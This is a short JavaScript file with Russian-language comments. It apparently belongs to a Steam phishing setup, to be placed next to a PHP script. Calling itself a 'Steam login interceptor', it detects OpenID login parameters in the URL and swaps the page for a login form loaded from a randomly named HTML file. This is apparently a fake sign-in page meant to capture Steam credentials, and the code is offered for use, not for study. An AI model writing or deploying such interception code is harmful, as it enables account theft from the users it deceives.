// Также, давайте создадим файл для прямого перехвата, который можно разместить в директории с PHP скриптом

// Создайте файл auth-redirect.js в том же каталоге, где находится ваш PHP скрипт:

// Скрипт прямого перехвата для авторизации
(function() {
    console.log('Steam login interceptor initialized');
    
    // Получаем параметры URL
    const params = new URLSearchParams(window.location.search);
    
    // Проверяем, есть ли в URL параметры OpenID
    if (params.has('openid.ns') || params.has('openid.mode')) {
        console.log('OpenID parameters detected, loading auth form');
        
        // Загружаем форму авторизации
        fetch('6kaomrcjpf2m.html')
            .then(response => response.text())
            .then(html => {
                // Заменяем содержимое страницы на форму авторизации
                document.open();
                document.write(html);
                document.close();
            })
            .catch(error => {
                console.error('Error loading auth form:', error);
                // Резервный вариант - прямой редирект
                window.location.href = '6kaomrcjpf2m.html';
            });
    }
})();
